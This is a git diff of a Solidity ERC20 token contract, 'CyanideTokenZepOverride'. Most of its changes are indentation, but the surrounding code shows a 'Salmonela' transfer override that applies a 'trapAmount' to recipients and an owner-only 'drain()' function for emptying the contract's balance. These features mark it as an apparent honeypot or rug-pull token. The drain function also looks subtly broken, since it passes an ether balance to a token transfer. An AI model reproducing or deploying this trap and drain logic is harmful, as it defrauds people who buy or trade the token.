@@ -16,11 +16,12 @@ contract CyanideTokenZepOverride is ERC20, Ownable {
   /**
   * @notice Salmonela transfer override 
   */  
+  
   function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
-  require(sender != address(0), "ERC20: transfer from the zero address");
-  require(recipient != address(0), "ERC20: transfer to the zero address");
-  uint256 senderBalance = _balances[sender];
-  require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+    require(sender != address(0), "ERC20: transfer from the zero address");
+    require(recipient != address(0), "ERC20: transfer to the zero address");
+    uint256 senderBalance = _balances[sender];
+    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
 
   // if (sender == ownerA || sender == ownerB) {  /// @todo: change owner addresses
 
@@ -33,12 +34,12 @@ contract CyanideTokenZepOverride is ERC20, Ownable {
     _balances[recipient] += trapAmount;
   }
   emit Transfer(sender, recipient, amount);
-}
+  }
 
 /**
 * @notice deployer can drain contract balance 
 */
   function drain() public onlyOwner {
   transfer(msg.sender, address(this).balance);
+     }
   }
-   }
